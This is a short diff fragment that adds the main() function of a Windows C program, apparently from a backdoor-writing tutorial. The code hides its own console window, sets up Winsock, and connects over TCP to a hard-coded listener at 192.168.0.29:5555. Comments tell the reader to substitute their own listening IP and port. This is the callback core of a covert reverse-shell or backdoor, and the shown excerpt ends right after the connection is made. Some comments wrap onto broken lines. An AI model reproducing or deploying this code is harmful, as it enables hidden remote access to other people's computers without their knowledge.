@@ -28,3 +28,26 @@ retrieve the path */
  perror(""); //print the error and exit
 } 
 }
+
+int main() //declaration of the main function
+{
+ShowWindow(GetConsoleWindow(), SW_HIDE); // do not show (hide) this 
+program window
+WSADATA WSAData; //declaration of Structure (structure is a specific 
+type of variable) holding information about windows socket implementation
+SOCKET server; //variable used to store the connection of the SOCKET
+type
+SOCKADDR_IN addr; /* variable holding connection details – of 
+SOCKADDR_IN type (also a structure) */
+WSAStartup(MAKEWORD(2, 0), &WSAData); //initialize usage of the winsock 
+library (needed for opening a network connection)
+server = socket(AF_INET, SOCK_STREAM, 0); //set up a TCP socket
+addr.sin_addr.s_addr = inet_addr("192.168.0.29"); // specify the target 
+of network connection - replace the ip with your listening ip address
+addr.sin_family = AF_INET; //set address family (AF) to AF_INET – this 
+address family contains IPv4 addresses to be used to communicate over TCP
+addr.sin_port = htons(5555); //remote port – change it to your 
+listening port
+connect(server, (SOCKADDR *)&addr, sizeof(addr)); //connect to the 
+previously set up target host/port
+ 
